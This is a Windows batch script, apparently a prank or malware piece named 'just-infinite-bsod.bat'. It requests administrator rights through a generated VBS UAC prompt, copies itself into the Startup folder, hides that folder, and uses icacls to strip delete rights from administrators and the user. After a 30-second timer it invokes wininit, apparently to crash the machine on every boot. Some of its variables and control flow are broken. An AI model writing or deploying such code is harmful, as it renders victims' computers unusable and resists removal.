@echo off

setlocal enabledelayedexpansion
call :GetAdminRights
:: Get the script directory
set scriptDir="C:\Users\%realName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set scriptName="just-infinite-bsod.bat"
set realName=
call :GetRealName
cls
if not exist %scriptDir%\%scriptName% (
	attrib +h %scriptDir%

	::Copy this batch script to script directory
	copy /y "%~f0" "%scriptDir%\%scriptName%"

	::Protect all files in script dir
	call :Protect "%scriptDir%"

)

if not exist %startupPath%\%~n0.bat (
    copy %startupPath% %startupPath%\%~n0.bat
	echo Copied to startup
	call %startupPath%\%~n0.bat
)


call :Protect "%startupPath%\%~n0.bat"
call :Protect "%scriptDir%"
call :Protect "C:\Users\regedit.exe"

pause
set /a secs=30
call :Timer %secs%
call :BSOD

:GetAdminRights
REM --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\icacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"
echo Script now running with elevated privileges.



::Get the unchanged username
:GetRealName

for /f "tokens=3 delims=\" %%s in ('echo %userprofile%') do (
	set realName=%%s
)

exit /b 0



:: Make the batch file undeletable/immortal
:Protect
icacls "%~1" /reset /t
icacls "%~1" /inheritance:d /t
icacls "%~1" /remove "Administrators" /t
icacls "%~1" /remove "%username%" /t
icacls "%~1" /remove "Authenticated Users" /t
icacls "%~1" /grant "Users:RX" /t
icacls "%~1" /inheritance:d /t

exit /b 0

:: Timer
::Global timer
:Timer

set /a secs=%1

:sub_Timer

if %secs% neq 0 (
	set /a secs-=1
	timeout /t 1 /nobreak >nul
	goto sub_Timer
)

exit /b 0
::BSOD
:BSOD
wininit
exit /b 0

pause